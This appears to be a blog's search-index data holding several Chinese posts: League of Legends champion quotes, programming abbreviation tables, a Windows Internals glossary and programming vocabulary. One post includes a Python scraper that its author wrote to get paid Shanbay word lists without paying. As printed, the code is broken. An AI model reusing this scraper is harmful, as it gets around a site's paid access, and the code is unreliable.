血液正在慢慢滴落。–猩红收割者 当黑色的玫瑰悄悄绽放，除了镜花水月，又有谁能了解我的心。–诡术妖姬 瞧瞧你的背后~–恶魔小丑 刀光剑影，铁石心肠，只有你知道在隐雾下的我，还是那么脆弱，容易感伤。–刀锋之影 血流成河！–猩红收割者 团结起来吧，我们必将凯旋。–天启者 击鼓，进军！–德邦总管 我没有过多的抱怨，漫天的乌鸦都是我的朋友，有这个就足够了。–末日使者 我会尽情享受他们的骨头的。–嗜血猎手 他们的胜利必将成为奢望！–刀锋意志 你们打架的时候总是这么不给力么？–众星之子 缓慢的步伐，踉跄的脚步，满嘴的胡话，还有嘴角那一抹苦涩的微笑，为何酒精都不能解脱我对你的思念。–酒桶 没有地方可以安生！–扭曲树精 你笑我为何拿上锤和盾，你说有你在，我不会受到伤害。可是你不知道，让我受伤的人，是你。–钢铁大使 收获之月，多美妙的名字啊。–猩红收割者 宝石们显露着它们的锋芒。–宝石骑士 你们只是玻璃制品，一碰就碎。–宝石骑士 我很想陪伴在你的身边，只是你不允许，没关系，在你需要帮助时，我还是会出现在你的身边。–暮光之眼 提莫队长正在待命！–迅捷斥候 要优美。–琴瑟仙女 我追逐的是你的背影，我跟随的是你的微笑，就算暴风雨到来，我依然在你的左右。–雷霆咆哮 下了手中的武器，我知道你已厌倦，目送你离开，亮的起黄昏的路灯，照亮你回家的路。–武器大师 为荣誉而战！–战争女神 您果然深思熟虑，召唤师。–暮光之眼 噢，你想要什么？–瘟疫之源 精彩的二重唱。–琴瑟仙女 我的剑刃从不颤抖。–刀锋意志 只有飞速的旋转，才可以止住我的泪水，忘记你的模样。–不祥之刃 给我找些更强的敌人！–嘉文四世 可以接受的冒险。–策士统领 让我来引领您走向胜利。–众星之子 选牌吧！–卡牌大师 我喜欢有心脏的勇士，并且绝对不会让他们过期。–猩红收割者 我知道自己一身的痛苦，我没有选择，我只有带着你的灵魂离去。–金属大师 将他们冲散！–牛头酋长 在漆黑的夜里你需要一道光照亮夜行的路，我燃烧了自己，但也造就了你我不能相拥。–复仇焰魂 当水晶箭射像你的时候，请不要害怕，只是为了让你片刻的驻足，好让我追赶你的脚步。–寒冰射手 目标已被标记。–暮光之眼 保护忠良！–嘉文四世 哪里有战斗，哪里就有我。–天启者 是啊！哈哈哈哈哈！–邪恶小法师 一曲终了，繁花散尽，伊人已逝，只余一声空叹。–死亡颂唱者 魔法！它在召唤我！–邪恶小法师 我来自深海，我没有朋友，大家都不和我玩，只有巨鲨是我的朋友，你愿意和他一起玩吗？–潮夕海灵 我是魔鬼！不许笑！–邪恶小法师 一切尽在卡牌之中。–卡牌大师 是摇，还是不摇，这是一个问题。–炼金术士 吃我一记重击！–亡灵勇士 中场休息时间！–琴瑟仙女 我想我会让你难受一阵子的！–宝石骑士 我用意念传达给您。–琴瑟仙女 这首是慢板曲，召唤师。–琴瑟仙女 完美的节拍。–琴瑟仙女 我会悼念你的。–宝石骑士 如果善待动物协会问起来的话，我们就说这些皮毛是仿制的。–野兽之灵 我宁愿相信一切，也不愿再相信世人，只有野兽能告诉我什么叫感情。–野兽之灵 忠诚之心永不停息。–首领之傲 我的&#96;道路，清澈无比。–众星之子 我会下达命令。–策士统领 俺很生气，后果很严重！–牛头酋长 视死如归，就在今天！–嘉文四世 正做着呢！–卡牌大师 如果我能休息就好了。–扭曲树精 要象征美好时光，请找琥珀。–宝石骑士 你是没有机会赢我的。–蛮族之王 没有退路了！–刀锋意志 亡命天涯，只是为了追寻你的足迹。却不想命运的捉弄，总是让你我天各一方。–法外狂徒 永恒痛苦的赠品。–首领之傲 战斗吧！–战争女神 这就是我收养那些流浪剑刃的结果。–刀锋意志 我好想射点儿什么！–麦林炮手 狩猎的时候到了。–嗜血猎手 我也试图终结过这困扰，但它总会卷土重来。–扭曲树精 执行均衡之令。–暮光之眼 德玛西亚，永世长存！–嘉文四世 是，长官！–迅捷斥候 不要否认你的本能，召唤师。–野兽之灵 你我的约定，我一直记得。那一道道璀璨的光辉，都是为你所亮。–光辉女郎 我愚蠢的以为，头上的金箍圈可以圈住你所有的爱，可是我手中的金箍棒改变不了那个开始，也决定不了这个结局，根本没有齐天大圣，我只是一只猴子。–齐天大圣 这很好玩吖！–恶魔小丑 我对你的爱就如闪电，狂暴而剧烈，飞出的飞镖，是我向你传达的思念。–狂暴之心 我醒来了，但是什么都不记得，我很害怕，我包裹住自己的身体，独自在黑暗中哭泣。–殇之木乃伊 为了内心的安宁。–众星之子 像节拍器一样准确无误。–琴瑟仙女 稳步前进！–刀锋意志 来次魔术戏法，咋样？–恶魔小丑 你的亲友们正在饱受折磨！–邪恶小法师 物是人非，可是我依然穿着嫁衣，在黑暗中寻找你的身影。–寡妇制造者 好极了！–猩红收割者 我不顾一切的冲出去，为你开辟一条安稳的路，我满腔热血的拍打着，为你抛开任何绊脚的石，最后，我坦然的微笑着用我的身体为你抵挡一切…因为我的身体上旋转着我们的誓言。–牛头酋长 你们跌倒了没？崩溃了么？–麦林炮手 胜利在望。–策士统领 攘除奸邪！–嘉文四世 我自人类诞生，却被人类抛弃，孤独的徘徊于世间，却与世间格格不入，于是我只能试图抓住每个遇到的生命，去倾诉那颗从不被理解的心。–蒸气机器人 为了父王！–嘉文四世 这局胜负已定。–嗜血猎手 漫天的冰雪冻结了我的心，但它冻结不了我心中的正义，我愿用我严寒的身躯冰冻这世间的邪恶。–冰晶凤凰 奉吾王之命！–德邦总管 我对你的爱就如闪电，狂暴而剧烈，飞出的飞镖是对你的思念。–狂暴之心 你必须跟着俺！–牛头酋长 开战吧！–蛮族之王 从我手中脱离的刀刃一直在飞舞，我不断在变强，只是为了守护我们的家园，等候你的归来。–刀锋意志 真正的意志是不会被击败的！–刀锋意志 我也希望变成蝴蝶的那一天，不再灰色，不再痛苦，不再让我丑陋的外表吓到美丽的你。–深渊巨口 我会在那儿的。–瘟疫之源 我可以想去哪里就去哪里，但是我只想去你心里。–祖安狂人 随心而动，随刃而行！–蛮族之王 我的目标很纯粹。–策士统领 我觉得我……变回人类了……–嗜血猎手 是的，只要998，就能让你爽到不能呼吸哟。–风暴女神 我们不知道何为怜悯，即使对象是你！–野兽之灵 你已经死了……只是你还没发觉而已。–暮光之眼 生存，就是折磨。–首领之傲 诺克萨斯人从来不会闲逛。–策士统领 哦好的，好的！–瘟疫之源 非常荣幸。–暮光之眼 有情况！–迅捷斥候 入体冰凉的月光，都比不上你绝情的目光。为了击碎你伪装的表面，我只能用尽全身力气挥出那惊鸿的半月弧光。——皎月女神 我束缚住了你的人，却束缚不住你的心。所以我只能远远跳离你身边，因为我知道，离你越近，我的心就会越痛。——皮城女警 沙漠中的太阳，是我对你爱的象征。——沙漠死神 在无人注视的角落，独自默默的弹奏。琴音带着我的思恋，妄图拉住你转身而去的袖角。——琴瑟仙女 我追逐的是你的背影，我跟随的是你的微笑。就算暴风雨到来，我依然能在你左右。——雷霆咆哮 默默的在背后望着你的背影，当你有危险时我会毫不犹豫的从天而降。哪怕双腿震得生疼，我依然会咬紧牙关再次跳向对手，抛出手中的战矛。哪怕是死，我也要保护你的安全。——战争之王 别看我的眼睛，里面只有愤怒和痛苦。我诅咒着一切，也诅咒着自己。——魔蛇之拥 金色的长驽陪伴我的一生，沾满鲜血的双手却磨灭不了心中的伤痛，我翻腾着身影在人群中闪烁，寻找一句最真心的问候。然后我悄悄的隐没、隐没，隐没在那孤寂的草丛……——暗夜猎手 行走于虚空，我彷徨，我迷茫。我不知何去何从，只有飘飘荡荡。——虚空行者 逝于晨，诞于暮。追寻着芳香的血液，环于世与墓之间。——猩红收割着 尘封千年，肉体早已湮灭，意识已然不清。探索了全部魔法的奥秘，只为能开辟虚空，寻找早已失去的你。——远古巫灵 你总说我太小，但是出现危险我都会跳跃到你身边，将危险推开。用手中的炮筒，守护我小小的爱。——麦林炮手 炙热的铁拳砸不开你面前的牢笼，不甘放弃的努力，只为了有一天能砸开牢笼见你一面。——皮城执法官","tags":[{"name":"语录","slug":"语录","permalink":"http://example.com/tags/%E8%AF%AD%E5%BD%95/"},{"name":"LOL","slug":"LOL","permalink":"http://example.com/tags/LOL/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"Game","slug":"E-手册/Game","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/Game/"}]},{"title":"常见编程命名缩写","date":"2023-10-27T01:24:02.471Z","path":"E_手册/En/常见命名缩写/","text":"通用 缩写 翻译 控件 缩写 翻译 address addr 地址 calendar cdr 日历 application app 应用程序 messageDialog msgdlg 消息框 asynchronization asyn 异步 drawer drw 抽屉 average avg 平均数 buttonGroup btngrp 按钮分组 bitmap bmp 位图 checkBox chk 复选框 buffer buf 缓冲区 container cntr 容器 character char 字符 button btn 按钮 color clr 颜色 comboBox cmb 下拉框 command cmd 命令 lable lbl 标签 delete del 删除 progressBar prg 进度条 destination dest&#x2F;dst 目的地 pageIndicator pgindic Tab分页控件 decrease dec 减少 radioButton rdo 单选框 device dev 设备 rangeSlider rngsld 滑块 different diff 不同的 scrollView svw 视图滚动 directory dir 目录 scrollBar vsb(垂直)&#x2F;hsb(水平) 滚动条 document doc 文档 slider sld 滑动器 dynamic dyna 动态的 spinBox spn 旋转框 environment env 环境 splitView spltvw 分割视图 error err 错误 stackView stackvw 堆栈视图 execute exec 执行 statusBar statbr 状态条 group grp 组 swipeView swpvw 滑动控件 image img 图像 switch sw 开关 information info 信息 tabBar tbbr tab栏 initialize init 初始化 textField txtfld 文本输入框 library lib 库 toolBar tlbr 工具栏 maximum max 最大值 toolTip tltp 提示框 minimum min 最小值 toolButton tlbtn 工具按钮 message msg 消息 treeView trvw 树形视图 number num 数字，数，数量 layout lyt 布局 object obj 对象 mainMenu mmnu 菜单栏 parameter Param 参数(形参) groupBox gbx 组合框 package pkg 打包 pictureBox pic 图片框 position pos 位置 listView lvw 列表视图 previous pre 前一个 window win(wnd) 窗口 process&#x2F;Procedure proc 进程&#x2F;过程 form frm 表单 pointer ptr 指针 textBox txt 文本框 password pwd 密码 linkLabel llbl 超链接标签框 public pub 公共的 dialog dlg 对话框 reference ref 引用 scrollIndicator scrlindic 滚动指示器 source src 源 string str 字符串 summation sum 和 synchronization sync 同步 system sys 系统 table tbl 表格 temporary tmp 临时 text txt 文本 variable var 变量 addition add 加法&#x2F;添加 argument arg 实参 array arr 数组 calculate calc 计算 configuration config 配置 column col 列 control ctrl 控制 hexadecimal hex 十六进制 original orig 原件 return rtn 返回 repeat rpt 重复 signal sig 信号 status stat 状态 stack stk 栈区 standard std 标准 trigger trig 触发 background bg 背景 escape esc 退出 user usr 用户 list lst 列表 server srv 服务 manager mgr 管理者 insert ins 插入 point pt 点 function func 函数 back bk 返回 break brk 间断 date dat 日期 edit edt 编辑 flag flg 标志 grid grd 网格 increment inc 增量 length len 长度 oracle ora 甲骨文数据库 panorama pano 全景 print prn 打印 program prg 程序 statistic stat 统计 administrator adm 管理员 database db 数据库 change chg 改变 click clk 点击 compare cmp 比较 coordinates coord 坐标 copy cpy 复制 current cur 当前的 dictionary dict 字典 display disp 显示 driver drv 驱动 extend ex&#x2F;ext 扩展 frame frm 框架&#x2F;帧 index idx&#x2F;ndx 索引 horizontal horz 水平 instance ins 实例 increase inc 增加 link lnk 链接 middle mid 中间 multiply mul 乘 resource res 资源 select sel 选择 test tst 测试 vertical vert 垂直 英文术语 描述 abstract 抽象的 abstraction 抽象性 access 访问 access level 访问级别 access function 访问函数 adapter 适配器 address 地址 address-of operator 取地址操作符 aggregation 聚合 algorithm 算法 allocate 分配 allocator 分配器 application 应用程序 architecture 体系结构 argument 实参 array 数组 arrow operator 箭头操作符 assembly language 汇编语言 assert(-ion) 断言 assign(-ment) 赋值 assignment operator 赋值操作符 base class 基类 base type 基类型 binary search 二分查找 binary tree 二叉树 binary operator 二元操作符 binding 绑定 bit 位 bitwise 以 bit 为单元逐一…… block 区块 boolean 布尔值 breakpoint 断点 build 构建 build-in 内置 bus 总线 byte 字节 cache 高速缓存（区） call 调用 callback 回调 call operator call 操作符 character 字符 child class 子类 class 类 class template 类模板 client 客户（端） code 代码 compatible 兼容 compiler time 编译期 compiler 编译器 component 组件 composition 复合 concrete 具象的 concurrent 并发 configuration 配置 connection 连接 constraint 约束（条件） construct 构件 container 容器 const C++ 关键字，constant 的缩写 constant 常量 constructor 构造函数 copy 拷贝（动词&#x2F;名词），副本（名词） create 创建 custom 定制 data 数据 database 数据库 data member 数据成员（变量） data structure 数据结构 debug 调试 debugger 调试器 declaration 声明式 default 缺省（默认） definition 定义式 delegate 委托 dereference 提领（解参考） derived class 派生类 design pattern 设计模式 destroy 销毁 destructor 析构函数 directive 指示符 document 文档 dynamic binding 动态绑定 entity 物体 encapsulation 封装 enum(-eration) 枚举 equality 相等 equivalence 等价 evaluate 核定、核算 exception 异常 explicit 显式 expression 表达式 file 文件 framework 框架 full specialization 全特化 function 函数 function object 函数对象 function template 函数模板 generic 泛型、泛化、一般化 getter 取值函数 global 全局的 handle 句柄 handler 处理函数 hash table 哈希表、散列表 header(file) 头文件 heap 堆 hierarchy 继承体系 identifier 标识符 implement(-ation) 实现 implicit 隐喻的、暗自的、隐式 information 信息 inheritance 继承 inline 内联 initialization list 初始化列表 initialize 初始化 instance 实体 instantiate 实体化 interface 接口 Internet 互联网 interpreter 解释器 invariants 恒常性 invoke 调用 iterator 迭代器 library 程序库 linker 连接器 literal 字面常量 list 链表 load 装载 local 局部的 lock 机锁 loop 循环 lvalue 左值 macro 宏 member 成员 member function 成员函数 memory 内存 memory leak 内存泄漏 meta 元 meta-programming 元编程 modeling 塑膜 module 模块 modifier 修饰符 multi-tasking 多任务 namespace 命名空间 native 固有的 nested 嵌套的 object 对象 object based 基于对象的 object model 对象模型 object oriented 面对对象 operand 操作数 operating system 操作系统 operator 操作符 overflow 溢出 overhead 额外开销 overload 重载 override 覆写 package 包 parallel 并行 parameter 参数、形参 parent class 父类 parse 解析 partial specialization 偏特化 pass by reference 按址传递 pass by value 按值传递 pattern 模式 placement delete （某种特殊形式的 delete operatoe） placement new （某种特殊形式的 new operatoe） pointer 指针 polymorphism 多态 preprocessor 预处理器 print 打印 printer 打印机 process 进程 program 程序 programer 程序员 programming 编程 project 项目 pseudo code 伪代码 quality 质量 queue 队列 raw 原始的、未经处理的 recursive 递归 refer to 指向、指称 reference 引用 regular expression 正则表达式 resolve 解析 return 返回 return type 返回类型 return value 返回值 runtime 运行期 rvalue 右值 save 保存 schedule 调度 scheduler 调度器 scope 作用域 search 查找 semantics 语义 setter 设值函数 signature 签名 smart pointer 智能指针 specialization 特化 source 源码 stack 栈 standard library 标准程序库 statement 语句 static 静态的 string 字符串 subtype 子类型 support 支持 template 模板 temporary object 临时对象 text 文本 thread 线程 thread safe 多线程安全 throw 抛出 token 语汇单元 type 类型 unary function 单参函数 underflow 下溢 unqualified 未经资格修饰 user 用户 user interface 用户界面 value 值 variable 变量 vector 矢量 virtual function 虚拟函数 virtual machine 虚拟机","tags":[{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"},{"name":"速查","slug":"速查","permalink":"http://example.com/tags/%E9%80%9F%E6%9F%A5/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"En","slug":"E-手册/En","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/En/"}]},{"title":"《深入理解Windows操作系统》一书附录中英语单词整理","date":"2023-10-27T01:24:02.469Z","path":"E_手册/En/CodeEn_from_Windows/","text":"摘自《深入理解Windows操作系统》附录章节的英语对照。 《深入理解Windows操作系统》术语对照表 英文 对照 access token 访问令牌 access validation 访问验证 access-control entry，ACE 访问控制项 access-control list，ACL 访间控制列表 Active Directory 活动目录 Address Windowing Extension，AWE 地址窗口 context switch 环境切换扩展 affinity 亲和性 alert 警醒 assertion 断言 asymmetric multiprocessing，ASMP 非对称多处理 asynchronous procedure call，APC 异步过程调用 attach 附载 authentication 认证 balance set manager 平衡集管理器 bin 巢箱 bind， binding 绑定 blue screen 蓝屏 boost 提升 boot 引导 boot partition 引导分区 boot sector 引导扇区 boot volume 引导卷 bucket 桶 bug check 错误检查 bus driver 总线型驱动程序 cable 线缆 cache manager 缓存管理器 cache miss 缓存未命中 Careful Write file system 谨慎写文件系统 catalog file 编目文件 cel 巢室 change journal 变化日志 class driver 类驱动程序 cluster 簇（用于磁盘存储单元），集群 COM 组件对象模型 committed memory 提交的内存 Common Internet File System， CIFS Internet 文件系统 compatibility 兼容性 concurrency 并发性 context 环境 copy-on-write 写时复制 crash analysis 崩溃分析 crash dump 崩溃转储 credential 凭证 critical section 临界区 cryptographic service provider，CSP 密码服务提供者 cyclic redundancy checksum， CRC 循环冗余检验和 DCOM 分布式组件对象模型 deadlock 死锁 debugger 调试器 deferred procedure call，DPC 延迟过程调用 defragmenter 碎片整理器 deliver 交付（针对APC&amp;DPC） dependency 相依性 desktop 桌面 device driver 设备驱动程序 Device Enumeration 设备列举 Discretionary access control，DAC 自主访问控制 disk spanning 磁盘跨展 dismount 卸载 dispatcher 分发器 dispatching 分发 Distributed File System，DFS 分布式文件系统 docking station 插接站 double-freeing 两次释放 drive letter 驱动器字母 Driver Verifier 驱动程序检验器 dynamic link library，DLL 动态链接库 Encrypting File System， EFS 加密文件系统 environment subsystem 环境子系统 ETW， Event Tracing for Windows Windows 事件跟踪 event 事件 Event Log 事件日志 exception 异常 exception dispatching 异常分发 exception frame 异常帧 exception handler 异常处理器 exception handling 异常处理 executive 执行体 executive object 执行体对象 extended partition 扩展分区 extensibility 扩展性 Extensible Firmware Interface，EFI 可扩展的固件接口 fast mutex 快速互斥体 fault tolerance 容错 fiber 纤程 fibre channel 光纤通道 file allocation table 文件分配表 file encryption key，FEK 文件加密密钥 file mapping object 文件映射对象 file system driver， FSD 文件系统驱动程序 file system recognizer 文件系统识别器 filter driver 过滤型驱动程序 firmware 固件 footprint 印迹 free list 空闲（页面）列表 function driver 功能型驱动程序 GINA 图形化标识和认证 Group Policy 组策略 guard page 守护页面 GUID 全局唯一标识符 GUID Partition Table，GPT GUID 分区表 handle 句柄 handle table 句柄表 handler 处理器 hardware abstraction layer 硬件抽象层（HAL） heap manager 堆管理器 hive 储巢 hotfix 热补丁 Hyper-Threading 超线程 I&#x2F;O request packet，IRP I&#x2F;O 请求包 idle process 空闲进程 idle thread 空闲线程 impersonation 模仿 inter-processor interrupt，IPI 处理器间的中断 interrupt controller 中断控制器 interrupt dispatch table 中断分发表 interrupt handler 中断处理器 interrupt request level，IRQL 中断请求级别 Interrupt service routine，ISR 中断服务例程 interupt 中断 job 作业 junction 交接 kernel 内核 kernel mode 内核模式 kernel object 内核对象 key ring 密钥环 keystroke 键击 last known good，LKG 最后已知的好配置，最后已知的好控制集 lazy write file system 延迟写文件系统 lazy writer 延迟写出器 Lightweight Directory Acess Protocol, LDAP 轻量的目录访问协议 local procedure call，LPC 本地过程调用 local security authentication 本地安全认证 lock convoy 锁封护 loCompletion I&#x2F;O 完成 logical cluster number.LCN 逻辑簇号 Logical Disk Manager.LDM 逻辑磁盘管理器 logical prefetcher 逻辑预取器 logical sequence number，LSN 逻辑序列号 logon 登录 look-aside list 预读列表 Low Fragmentation Heap，LFH 低碎片堆 LUID 本地唯一标识符 mailslot 邮件槽 managed code 托管代码 manifest 清单 mapped file 映射的文件 master boot record.MBR 主引导记录 master file table 主文件表 mechanism 机制 memory 内存 memory descriptor list.MDL 内存描述符列表 memory mapped file 内存映射文件 metadata 元数据 microkernel 微内核 minidump 小转储 miniport 小端口 miniport driver 小端口驱动程序 mirrored volume 镜像卷 MMC snap-in MMC 加载件 modified page writer 已修改页面写出器 mount 挂载 mount point 挂载点 multimaster replication 多主复制 Multiple Provider Router 多提供者转发器 Multiple UNC Provider，MUP 多UNC提供者 multiprocessing 多处理 multitasking 多任务 mutant 突变体 mutex 互斥体 named pipe 命名管道 native 原生的 network address translation.NAT 网络地址转译 Network Driver Interface Specification, NDIS 网络驱动程序接口规范 Network Monitor 网络监视器 network share 网络共享体 NTFS object atribute NTFS 对象属性 NUMA（non-uniform memory architecture） 非一致的内存结构 objcct manager 对象管理器 object linking and embedding. OLE 对象链接和嵌入 ommit 提交 on-disk structure 磁盘上的结构 Open System Interconnection， OSI 开放系统互联 opportunistic locking，oplock 机会锁 overlapped 可重叠的 page 页面 page directory 页目录 page directory entry，PDE 页目录项 page fault 页面错误 page file，paging file 页面文件 page frame number，PFN 页面帧编号 page table 页表 page table entry，PTE 页表项 pageable 换页的 paged pool， nonpaged pool 换页内存池，非换页内存池 pager 换页器 parition 分区 partition table 分区表 payload 有效载荷 Performance Monitor 性能监视器 Performance tool 性能工具 Physical Address Extension，PAE 物理地址扩展 placement policy 放置策略 plug and play 即插即用 pool tracking 内存池跟踪 port driver 端口驱动程序 portability 可移植性 preempt 抢占 preemptive 抢先式 prefetcher 预取器 principal 安全个体 priority boost 优先级提升 priority inversion 优先级倒置 privilege 特权 procedure 过程 process 进程 Process environment block，PEB 进程环境块 process explorer 进程管理器（视上下文 process manager 进程管理器（视上下文 processor 处理器 profile 轮廓，性能剖析 prototype page table entry，prototype PTE 原型页表项 push lock 推锁 quality of service，QOS 服务质量 quantum 时限 quantum boosting 时限增大 queue 队列 quota 配额 quota charges 配额花费 RAM Optimizer RAM 优化器 read-ahead 预读 record 记录 recoverability 可恢复性 Recovery Console 恢复控制台 redirector 重定向器 redo 重做 reference count 引用计数 reference monitor 引用监视器 registry 注册表 registry key 注册表键 registry value 注册表值 reliability 可靠性 Remote Direct Memory Access， RDMA 远程直接内存访问 Remote NDIS 外接NDIS remote procedure call，RPC 远过程调用 reparse 重解析 reparse point 重解析点 reserved memory 保留的内存 resource accounting 资源记账 resource gate 资源门控 Resource Reservation Protocol，RSVP 资源预留协议 robustness 健壮性 routine 例程 run 行串（用于NTFS结构中） scalability 可伸缩性 scatter&#x2F;gather LI&#x2F;O 分散&#x2F;聚集 I&#x2F;O scheduler 调度器 schema 表结构 secondary object namespace 从属对象名字空间 section object 内存区对象 section， memory section 内存区 sector sparing 扇区备用 secure attention sequence.SAS 安全注意序列 Security Accounts Manager， SAM 安全账户管 security credential 安全凭证 Security descriptor 安全描述符 security identifier， SID 安全标识符 security quality of service， SQOS 安全服务质量 Security reference monitor 安全引用监视器 Security Support Provider Interface，SSPI 安全支持提供者接口 security validation 安全验证 Semaphore 信号量 serial port 串行口 server 服务器 service 服务 Service Control Manager，SCM 服务控制管理器 service descriptor table 服务描述符表 Service Pack 服务补丁包 session manager 会话管理器 session namespace 会话名字空间 shared memory 共享的内存 shim 铺垫 shutdown 停机 socket 套接字 sof fault 软错误 Software Restriction Policy 软件限制策略 spanned volume 跨距卷 spin-down 停止旋转 spinlock 自旋锁 splash screen 启动屏幕 stack frame 栈帧 stack location 栈单元 stack overrun 栈溢出 stack trash 栈破坏 standby list 备用（页面）列表 startup 启动 starvation 饥饿 storage area network，SAN 存储区域网络 striped volume 条带卷 stub 存根 symbolic link 符号链接 symmetric multiprocessing， SMP 对称多处理 synchronization 同步 system service 系统服务 system service call 系统服务调用理器 system service dispatching 系统服务分发 system volume 系统卷 targeted DPC 定向的DPC（与特定的CPU相关联） Task Manager 任务管理器 task ofloading 任务外移 TDI transport TD 1传输器 terminal service 终端服务 thread 线程 Thread environment block，TEB 线程环境块 thread scheduling 线程调度 thread-thrashing 线程频繁轮换 tick 嘀嗒 time slice 时间片 timer 定时器 TLS 线程局部存储区 transaction 事务 transition 转移，转换 Translation Look-aside Buffer，TLB 地址转译快查缓冲区 Transport Driver Interface， TDI 传输驱动程序接口 trap 捕获（动词），陷阱（名词） trap frame 陷阱帧 trap handler 陷阱处理器 trigger 触发器 trim 修剪 truncate 截断、截短 undo 撤销 unicast 单播 Universal Disk Format， UDF 通用磁盘格式 Universal Naming Convention， UNC 统一命名规范 Universal Plug and Play.UPnP 通用即插即用 unmanaged code 非托管代码 user mode 用户模式 view 视图（确切含义视上下文） virtual address control block，VACB 虚拟地址控制块 Virtual address descriptor，VAD 虚拟地址描述符 virtual cluster number，VCN 虚拟簇号 volatile 易失的、易失性 window station 窗口站 Windows 管理规范 Windows Driver Model， WDM Windows 驱动程序模型 Windows Error Reporting Windows 错误报告 Windows File Protection， WFP Windows 文件保护机制 Windows Global Flags Windows 全局标志 Windows Internet 名称服务 Windows Internet Name Service WINS，Windows管理规范 Windows Management Instrumentation Windows管理规范 Windows Sockets Direct， WSD Windows 套接字直接访问 working set 工作集 working set trimming 工作集修剪 write throtling 写节流 write-behind 滞后写 write-through 直写 yield 放弃 zero list 零（页面）列表 zero page thread 零页面线程","tags":[{"name":"手册","slug":"手册","permalink":"http://example.com/tags/%E6%89%8B%E5%86%8C/"},{"name":"《深入理解Windows操作系统》","slug":"《深入理解Windows操作系统》","permalink":"http://example.com/tags/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"},{"name":"英语","slug":"英语","permalink":"http://example.com/tags/%E8%8B%B1%E8%AF%AD/"}],"categories":[{"name":"E_手册","slug":"E-手册","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"En","slug":"E-手册/En","permalink":"http://example.com/categories/E-%E6%89%8B%E5%86%8C/En/"}]},{"title":"编程常用英语词汇","date":"2023-10-27T01:24:02.467Z","path":"E_手册/En/CodeEn/","text":"编程常用英语整理一、交互式环境与print输出1、print：打印&#x2F;输出2、coding：编码3、syntax：语法4、error：错误5、invalid：无效6、identifier：名称&#x2F;标识符7、character ：字符 二、字符串的操作1、user：用户2、name：姓名&#x2F;名称3、attribute：字段&#x2F;属性4、value：值 三、重复&#x2F;转换&#x2F;替换&#x2F;原始字符串1、upper：上面2、lower：下面3、capitalize：用大写字母写或印刷4、title：标题5、replace：替换6、old：旧的7、new：新的8、count：计数9、swap：互换10、case：情形11、path：路径12、new：新的\\新建13、project：项目14、test：测试15、file：文件16、data：数据 四、去除&#x2F;查询&#x2F;计数1、strip：去除2、index：索引3、find：查找4、count：计数5、start：开始6、end：结束7、chars：字符8、sub：附属 五、获取输入&#x2F;格式化1、input：输入2、prompt：提示3、ID：身份证4、format：格式化5、args（argument）：参数6、kwargs：关键字参数7、year：年8、month：月9、day：日 六、元祖1、tuple：元组2、max：最大3、min：最小4、iterable：可迭代5、key：关键字6、function：方法&#x2F;函数7、stop：停止8、object：对象 七、列表1、list：列表2、reverse：反向3、true：真4、false：假5、append：附加6、extend：扩展7、insert：插入8、pop：取出9、remove：移除10、del（delete）：删除11、clear：清除12、sort：排序 八、集合1、set：集合&#x2F;设置2、add：添加3、update：更新4、discard：丢弃5、intersection：相交6、union：联合7、difference：差数8、symmetric：对称9、in：在…里面10、not：不&#x2F;不是11、disjoint：不相交12、subset：子集13、superset：父集&#x2F;超集14、copy：复制 九、字典1、dict：字典2、key：键&#x2F;关键字3、value：值4、item：项5、mapping：映射6、seq（sequence）：序列7、from：从&#x2F;来自8、get：获取9、default：默认10、none：没有11、arg：可变元素12、kwargs（keyword args）：可变关键字元素 十、常用的一些必备的英语单词 Projects ：项目 Process finished with exit code 0 进程结束，退出代码为0，一般是执行成功的过程 Process： 过程 code ：代码 Traceback：回溯 File：文件 line：行 module：模块[‘mɑdʒul] NameError：名称错误 is not defined：没有定义 SyntaxError：语法错误 literal：文字，文字的 string：字符串 scanning：扫描 EOL ：寿命终止 IndentationError：缩减错误 unindent：取消缩进 match：匹配 indentation：缩进 [,ɪndɛn’teʃən]缩进 unindent does not match any outer indentation level： 未缩进不匹配任何外部缩进级别 invalid syntax：无效的语法 十一、扇贝扇贝上有专门整理好的pyhon常用单词，但是要支付199贝壳。 我写了个爬虫，免199贝壳去支付…拿下网页的单词，下面是代码： 12345678910111213141516171819202122232425262728293031323334import requestsimport refile = open(&quot;vocabulary.doc&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;)def spider(url): res = requests.get(url).text pattern = &#x27;&lt;strong&gt;([a-z,A-Z]*?)&lt;/strong&gt;\\s*&lt;/td&gt;\\s*&lt;td class=&quot;span10&quot;&gt;(.*?)&lt;/td&gt;&#x27; vocabulary_list = re.findall(pattern, res) for vocabulary in vocabulary_list: file.writelines((vocabulary[0].strip(&#x27;&#x27;), vocabulary[1].strip(&#x27;&#x27;), &quot;\\n&quot;))url_list = [&quot;[词串： list 1](https://www.shanbay.com/wordlist/104899/202159/?page=)&quot;, &quot;[词串： list 2](https://www.shanbay.com/wordlist/104899/202162/?page=)&quot;, ]for url in url_list: for i in range(1, 10): url = &quot;[词串： list 1](https://www.shanbay.com/wordlist/104899/202159/?page=)&quot; + str(i) spider(url)file.close() 会生成一个word的结果文档在代码运行的同一目录下，结果如下，没有可以排版，最好是放在excel下。 十二、程序员常用单词600个A application 应用程式 应用、应用程序 application framework 应用程式框架、应用框架 应用程序框架 architecture 架构、系统架构 体系结构 argument 引数（传给函式的值）。叁见 parameter 叁数、实质叁数、实叁、自变量 array 阵列 数组 arrow operator arrow （箭头）运算子 箭头操作符 assembly 装配件 assembly language 组合语言 汇编语言 assert (ion) 断言 assign 指派、指定、设值、赋值 赋值 assignment 指派、指定 赋值、分配 assignment operator 指派（赋值）运算子 &#x3D; 赋值操作符 associated 相应的、相关的 相关的、关联、相应的 associative container 关联式容器（对应 sequential container） 关联式容器 atomic 不可分割的 原子的 attribute 属性 属性、特性 audio 音讯 音频 A.I. 人工智慧 人工智能 B background 背景 背景（用於图形着色） 后台（用於行程） backward compatible 回溯相容 向下兼容 bandwidth 频宽 带宽 base class 基础类别 基类 base type 基础型别 (等同於 base class) 